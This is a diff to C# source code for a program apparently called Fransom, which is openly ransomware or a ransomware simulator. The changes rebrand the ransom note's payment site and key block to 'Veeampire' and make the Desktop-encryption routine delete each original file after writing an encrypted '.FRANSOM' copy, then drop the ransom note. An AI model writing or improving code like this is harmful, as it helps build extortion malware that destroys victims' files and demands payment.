@@ -235,7 +235,7 @@ namespace Fransom
                               "\n"+
                               "2) If you have any problems connecting or using TOR network\n" +
                               "\n"+
-                              "  a) Open our website: https://FRANSOMdecrypt.top/werqsdfewrt\n" +
+                              "  a) Open our website: https://VeeampireDeCrypt.top/werqsdfewrt\n" +
                               "  b) Follow the instructions on this page.\n" +
                               "\n" +
                               "Warning: the second (2) method can be blocked in some countries. That is why the first (1) method is recommended to use.\n" +
@@ -254,9 +254,9 @@ namespace Fransom
                               "\n" +
                               "-------------------------------------------------------------------------------\n" +
                               "THIS IS A SPECIAL BLOCK WITH A PERSONAL AND CONFIDENTIAL INFORMATION! DO NOT TOUCH IT WE NEED IT TO IDENTIFY AND AUTHORIZE YOU\n" +
-                              "---BEGIN FRANSOM KEY---\n" +
+                              "---BEGIN Veeampire KEY---\n" +
                               "[snip]\n" +
-                              "---END FRANSOM KEY---\n";
+                              "---END Veeampire KEY---\n";
             string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             // Combine the desktop path with the filename to create the full path
@@ -1275,7 +1275,7 @@ namespace Fransom
             }
         }
 
-          public void EncryptUserProfile()
+        public void EncryptUserProfile()
         {
             StringCollection stringCollection = new StringCollection();
             EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
@@ -1287,8 +1287,19 @@ namespace Fransom
                 string file_name = obj.ToString();
                 Logger.WriteLine("Encrypting object: " + file_name, SensitiveData);
                 string enc_file = file_name + ".FRANSOM";
-                EncryptFile(file_name, enc_file, password);
+                try
+                {
+                    EncryptFile(file_name, enc_file, password); // Encrypt the file
+                    File.Delete(file_name); // Deletes the original file
+                    Logger.WriteLine("Successfully encrypted and deleted: " + file_name, SensitiveData);
+                }
+                catch (Exception ex)
+                {
+                    Logger.WriteLine("Encryption failed for: " + file_name + ". Error: " + ex.Message, SensitiveData);
+                }
             }
+
+            // After all files have been encrypted and deleted, drop the ransom note.
             RansomNote();
         }
 
@@ -1310,7 +1321,7 @@ namespace Fransom
                     DecryptFile(file_name, dec_file.ToString(), password);
                 }
             }
-           
+            CleanupUserProfile();
         }
 
 
